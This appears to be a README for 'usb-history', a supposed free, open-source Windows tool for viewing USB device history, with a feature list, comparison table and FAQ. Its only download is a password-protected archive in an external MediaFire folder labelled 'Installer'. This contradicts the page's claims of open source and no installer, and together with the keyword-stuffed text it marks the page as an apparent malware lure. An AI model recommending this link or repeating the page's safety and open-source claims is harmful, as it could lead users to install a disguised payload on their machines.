# usb-history

🔌 Free, open-source USB device history viewer for Windows — see every stick, phone and drive ever connected. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Full connection history** — every USB device ever plugged in, with first and last seen timestamps
- ✅ **Rich identity data** — vendor, product, VID/PID, serial and device class columns sortable and searchable
- ✅ **Mount point mapping** — shows which drive letter a storage device took during use
- ✅ **Connected-now view** — a live tab of currently attached devices with safe eject shortcuts
- ✅ **Export for audits** — CSV with all fields for compliance checks and asset tracking
- ✅ **No kernel driver** — reads standard device registry data; safe on locked-down workstations
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why usb-history

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **usb-history** | USBDeview | USBLogView | Device Manager |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Free | Built-in |
| Open source | **Yes** | No | No | No |
| First-seen and last-seen dates | **Yes** | Yes | Connect only | No |
| Mount point history | **Yes** | Partial | No | Current only |
| CSV audit export | **Yes** | Yes | No | No |
| Portable, no install | **Yes, 100 MB** | Zip | Zip | With OS |

## FAQ

**how to see USB devices connected to my computer history?**

Windows forgets devices the moment they are unplugged unless you dig through registry keys nobody documents. usb-history reads that log and shows every device with identity data and first and last seen dates, exportable for audits. It is a 100 MB portable exe, MIT, offline, no admin driver required.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark table (#121418, cyan #22D3EE): rows per device with vendor, VID/PID and Last seen columns, search field typed SanDisk, export button.
2. Device drawer: serial number, device class, mount history E then F, connected-now badge, safe eject action link.
3. Audit view: date range filter, CSV export preview with 87 rows, duplicate serial warning chip in amber.

## Download

| Source | Link |
|---|---|
| 💾 **Installer usb-history** | [Installer usb-history](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).